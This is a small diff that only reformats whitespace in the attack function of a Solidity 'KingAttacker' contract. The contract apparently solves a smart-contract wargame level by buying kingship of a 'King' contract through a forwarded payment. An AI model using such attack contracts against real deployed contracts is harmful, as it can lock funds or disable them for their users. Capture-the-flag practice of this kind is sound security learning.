@@ -17,11 +17,11 @@ contract KingAttacker {
     function attack(address kingAddress) external payable {
         King king = King(payable(kingAddress));
         uint256 currentPrice = king.prize();
-        if(msg.value < currentPrice){
+        if (msg.value < currentPrice) {
             revert MSG_VALUE_LESS_THAN_PRICE();
         }
-        (bool success, ) = address(king).call{value: msg.value}("");
-        if(!success){
+        (bool success,) = address(king).call{value: msg.value}("");
+        if (!success) {
             revert();
         }
     }
